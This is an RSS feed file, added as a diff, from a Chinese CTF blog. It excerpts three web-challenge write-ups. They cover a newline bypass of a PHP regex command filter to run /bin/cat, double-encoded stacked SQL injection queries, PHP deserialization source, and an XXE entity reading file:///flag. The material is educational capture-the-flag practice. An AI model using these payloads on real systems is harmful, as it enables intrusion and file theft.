@@ -1,0 +1,67 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>XXE on wh1sper</title>
+    <link>https://anthem-whisper.github.io/tags/xxe/</link>
+    <description>Recent content in XXE on wh1sper</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Wed, 23 Sep 2020 00:00:00 +0000</lastBuildDate><atom:link href="https://anthem-whisper.github.io/tags/xxe/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>BUUOJ刷题记录(3)</title>
+      <link>https://anthem-whisper.github.io/p/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%953/</link>
+      <pubDate>Wed, 23 Sep 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://anthem-whisper.github.io/p/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%953/</guid>
+      <description>[FBCTF2019]RCEService 考点：%0a绕过正则匹配，绝对路径调用系统命令
+要求用json传入cmd参数RCE，但是只给了ls命令其他的都不给
+比赛的时候应该是给了源码：
+&amp;lt;?phpputenv(&#39;PATH=/home/rceservice/jail&#39;);if (isset($_REQUEST[&#39;cmd&#39;])) {$json = $_REQUEST[&#39;cmd&#39;];if (!is_string($json)) {echo &#39;Hacking attempt detected&amp;amp;lt;br/&amp;amp;gt;&amp;amp;lt;br/&amp;amp;gt;&#39;;} elseif (preg_match(&#39;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#39;, $json)) {echo &#39;Hacking attempt detected&amp;amp;lt;br/&amp;amp;gt;&amp;amp;lt;br/&amp;amp;gt;&#39;;} else {echo &#39;Attempting to run command:&amp;amp;lt;br/&amp;amp;gt;&#39;;$cmd = json_decode($json, true)[&#39;cmd&#39;];if ($cmd !== NULL) {system($cmd);} else {echo &#39;Invalid input&#39;;}echo &#39;&amp;amp;lt;br/&amp;amp;gt;&amp;amp;lt;br/&amp;amp;gt;&#39;;}}?&amp;gt;正则匹配的时候没有用m修饰符(换行匹配)，所以我们可以用%0a来绕过
+然后他设置了PATH=/home/rceservice/jail，这个目录下只有ls一个命令，想要调用其他系统命令我们还要传入绝对路径，比如/bin/cat。
+flag在PATH的上级目录。
+?cmd={%0A&amp;quot;cmd&amp;quot;:&amp;quot;/bin/cat /home/rceservice/flag&amp;quot;%0A}[GYCTF2020]FlaskApp 考点：flaskSSTI、pin码
+referer：https://blog.csdn.net/Alexhcf/article/details/108400293
+从base64解码发现SSTI 题目最开始给了两个页面，一个是base64加密、一个是base64解密
+在base64解密的页面如果解密出现错误的话，会开启debug
+而且在base64解密的页面发现了模板注入，传入{{config}}的base64编码会看到以下界面：</description>
+    </item>
+    
+    <item>
+      <title>DozerCTF2020_web</title>
+      <link>https://anthem-whisper.github.io/p/dozerctf2020_web/</link>
+      <pubDate>Mon, 15 Jun 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://anthem-whisper.github.io/p/dozerctf2020_web/</guid>
+      <description>又是一场把萌新骗过去杀的比赛，弹计算器好玩，域渗透不会，xxe盲打ssrf学到了
+ sqli-labs 0 考点：URL二次编码，堆叠注入
+堆叠其实很简单，也发现什么过滤，主要是二次编码有点坑。。。
+查看库名：
+?id=1%2527;show%20databases;%23 查看表名：
+?id=1%2527;show%20tables;%23查看表的第一条数据：
+?id=1%2527;handler%20uziuzi%20open;handler%20uziuzi%20read%20first;%23 flag{594cb6af684ad354b4a59ac496473990}
+白给的反序列化 考点：PHP反序列化
+开题送码：
+&amp;lt;?phpclass home{private $method;private $args;function __construct($method, $args){$this-&amp;gt;method = $method;$this-&amp;gt;args = $args;}function __destruct(){if (in_array($this-&amp;gt;method, array(&amp;quot;mysys&amp;quot;))) {call_user_func_array(array($this, $this-&amp;gt;method), $this-&amp;gt;args);}}function mysys($path){print_r(base64_encode(exec(&amp;quot;cat $path&amp;quot;)));}function waf($str){if (strlen($str) &amp;gt; 8) {die(&amp;quot;No&amp;quot;);}return $str;}function __wakeup(){$num = 0;foreach ($this-&amp;gt;args as $k =&amp;gt; $v) {$this-&amp;gt;args[$k] = $this-&amp;gt;waf(trim($v));$num += 1;if ($num &amp;gt; 2) {die(&amp;quot;No&amp;quot;);}}}}if ($_GET[&#39;path&#39;]) {$path = @$_GET[&#39;path&#39;];unserialize($path);} else {highlight_file(__FILE__);}?</description>
+    </item>
+    
+    <item>
+      <title>NCTF2019_Fakexml_cookbook</title>
+      <link>https://anthem-whisper.github.io/p/nctf2019_fakexml_cookbook/</link>
+      <pubDate>Fri, 27 Dec 2019 00:00:00 +0000</pubDate>
+      
+      <guid>https://anthem-whisper.github.io/p/nctf2019_fakexml_cookbook/</guid>
+      <description>NCTF2019web1:fake xml cookbook_writeup
+By:0xfxxker_wh1sper
+解题思路：
+这道题名字是XML，关于XML我知道的只有两种手段，一是普通XML注入，通过闭合各种标签然后植入恶意代码运行脚本，但是一般这种手段实在攻击者能够掌握password字段并且能够保存到服务器当中去才能够添加一个新的admin账户（当时也在这里卡了很久），还有一种就是XXE(XML External Entity Injection) 全称为 XML 外部实体注入，利用点是外部实体，如果能注入，外部实体并且成功解析的话，这就会大大拓宽我们 XML 注入的攻击面（这可能就是为什么单独说 而没有说 XML 注入的原因吧，或许普通的 XML 注入真的太鸡肋了，现实中几乎用不到）。
+用户名，密码随便试一下：
+抓包，分析:
+于是我构造了如下XML外部实体，大概是这样
+注意事项：
+&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;&amp;lt;!DOCTYPE dy（这里有一个空格） [&amp;lt;!ENTITY dy SYSTEM &amp;quot;file:///flag&amp;quot;&amp;gt;]&amp;gt;&amp;lt;user&amp;gt;&amp;lt;username&amp;gt;&amp;amp;dy;（分号）&amp;lt;/username&amp;gt;&amp;lt;password&amp;gt;123&amp;lt;/password&amp;gt;&amp;lt;/user&amp;gt;通过POST请求发过去
+服务器说登录失败，并且返回&amp;amp;dy，也就是/flag的内容
+这里挂一篇关于xxe的学习文档：http://url.cn/54Ucm5w</description>
+    </item>
+    
+  </channel>
+</rss>
